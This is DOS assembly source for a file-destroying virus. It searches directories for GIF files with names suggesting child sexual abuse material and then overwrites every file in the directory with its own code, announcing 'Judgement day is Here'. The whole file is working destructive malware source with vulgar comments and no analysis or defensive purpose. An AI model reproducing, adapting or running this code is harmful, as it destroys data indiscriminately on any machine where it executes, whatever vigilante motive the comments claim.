.model tiny
.radix 16
.code
        org 100h
virus_size      equ     last - start

start:  




        call    where                   ; push ip onto stack
where:  mov     si,sp                   ; mov the SP into si
        lea     di,[wipe]               ; point di into buffer 
        movsw                           ; move it
        mov     bp,[wipe]               ; move it again into bp
        add     sp,02                   ; inc the Sp 
        sub     bp,103h                 ; sub to get delta offset 
        
        push    cs                      ; CS=DS
        pop     ds                      ; CS=DS
        lea     dx,offset [bp+root]
        mov     ah,3bh                  ; change directory 
        int     21
        
        jc      wierd
        jmp     loc_1
wierd:  ret

Loc_1:  push    cs                      ; CS=DS
        pop     ds                      ; CS=DS
        mov     cx,0010                 ; search for directory 
        lea     dx,offset [bp+must]     ; our attributes
        mov     ah,4eh                  ; find it 
        int     21                      ; dos does it
        jc      wierd                   ; screwed up bail
        
check:  push    cs                      ; CS=DS
        pop     ds                      ; CS=DS
        lea     dx,offset [bp+1eh+80h]
        mov     ah,3bh                  ; change directory 
        int     21
        jc      wierd

Write:  lea     si,offset [bp+1eh+80h]
        lea     di,offset [bp+msg_1+15h]
        mov     cx,0a
        movsb
        rep     movsb
        
        lea     si,offset [bp+msg_1+15h]

ldoloop:lodsb
        cmp     al,0
        jz      end_it
        jmp     ldoloop

end_it: mov     [si],byte ptr 0dh
        movsb
        mov     [si],byte ptr 0ah
        movsb
        mov     [si],byte ptr '$'
        movsb
        
        push    cs                      ; CS=DS
        pop     ds                      ; CS=DS
        lea     dx, offset [bp+msg_1]   ; Display message
        mov     ah,09
        int     21

fndvic: mov     dx, offset the_gif       ; if I find it your fucked
        mov     ah,4eh                   ; find first file function
        int     21h
        jnb      Hel_bnd
        
        mov     dx, offset the_gif1      ; if I find it your fucked
        mov     ah,4eh                   ; find first file function
        int     21h
        jnb      Hel_bnd

        mov     dx, offset the_gif2      ; if I find it your fucked
        mov     ah,4eh                   ; find first file function
        int     21h
        jnb      Hel_bnd

        mov     dx, offset the_gif3      ; if I find it your fucked
        mov     ah,4eh                   ; find first file function
        int     21h
        jnb      Hel_bnd
        
        mov     dx, offset the_gif4      ; if I find it your fucked
        mov     ah,4eh                   ; find first file function
        int     21h
        jnb     Hel_bnd
        
        mov     dx, offset the_gif5      ; if I find it your fucked
        mov     ah,4eh                   ; find first file function
        int     21h
        jnb     Hel_bnd
        
        mov     dx, offset the_gif6      ; if I find it your fucked
        mov     ah,4eh                   ; find first file function
        int     21h
        jnb     Hel_bnd

        mov     dx, offset the_gif7      ; if I find it your fucked
        mov     ah,4eh                   ; find first file function
        int     21h
        jnb     Hel_bnd

        mov     dx, offset the_gif8      ; if I find it your fucked
        mov     ah,4eh                   ; find first file function
        int     21h
        jnb     Hel_bnd

        jmp     chng

Chng1:  push    cs                       ; CS=DS
        pop     ds                       ; CS=DS
        lea     dx,offset [bp+root]      ; change to the root directory 
        mov     ah,3bh                   ; change directory 
        int     21
        jc      chng

Hel_bnd:                                 ; this is the destruction 
        push   cs                        ; CS=DS
        pop     ds                       ; CS=DS
        lea     dx, offset [bp+msg_2]    ; Display message
        mov     ah,09
        int     21
        
        push    cs                       ; code segement and data segement 
        pop     ds                       ; are the same  cs same as ds
        mov     dx, offset path          ; point at the file name
        mov     ah,4e                    ; dos find first file function 
        int     21                       ; dos call
        jc      error                    ; if we can't find the victum bail
                                         
do_it:  mov     bx,09eh                  ; move this location into by
        push    cs                       ; do the code and data segement thing
        pop     ds                       ; CS=DS
        mov     dx,bx                   ; move the file handle into dx
        mov     ax,3d02                 ; open file read write
        int     21h                     ; dos call
        jc      nuclear                 ; can't open bail out 

        mov     bx,ax                   ; file handle is in ax move it to bx
        push    cs                      ; do the code segement and data thing
        pop     ds                      ; CS=DS
        mov     dx,0200h                ; what are we wanting to write
        dec     dh
        mov     cx,virus_size           ; how much do we want to write
        mov     ah,40                   ; dos write file function 
        int     21                      ; dos call 
        
        mov     ah,3e                   ; If its opened we must close it
        int     21                      ; dos call 
        mov     ah,4f
        int     21h
        
        jc      nuclear
        jmp     do_it     

nuclear:push    cs 
        pop     ds                      ; CS=DS
        lea     dx,offset [bp+dos_dir]     ; CS=DS
        mov     ah,3bh                  ; change directory 
        int     21
        jc      error
        ret
Chng:   push    cs
        pop     ds                      ; CS=DS
        lea     dx,offset [bp+root]     ; CS=DS
        mov     ah,3bh                  ; change directory 
        int     21
        jc      error

fn_nxt: mov     ah,4fh
        int     21h
        jnc     dork


error:  ret

dork:    jmp     check
mutate:  jmp     hel_bnd
last:
dos_dir  db      '/DOS',0
must     db      '*.*',0 
path     db      '*.*',0                 
The_gif  db      'YOUNG.GIF',0          ; This is the shit we're after
The_gif1 db      'KIDS.GIF',0           ; This is the shit we're after
The_gif2 db      'KIDPORN.GIF',0        ; This is the shit we're after
The_gif3 db      'KIDPIC.GIF',0         ; This is the shit we're after
The_gif4 db      'CHILD.GIF',0          ; This is the shit we're after
The_gif5 db      'KIDSEX.GIF',0         ; This is the shit we're after
The_gif6 db      'CHILD.GIF',0          ; This is the shit we're after
The_gif7 db      'CHILD.GIF',0          ; This is the shit we're after
The_gif8 db      'CHILD.GIF',0          ; This is the shit we're after




wipe     dw      ?
must1    dw      ? 
must2    dw      ?
root     db      '/',0
msg_2    db      'Judgement day is Here $',0
msg_1    db      'Searched directory = ',0
spacer    db      'the',0
end start
end code
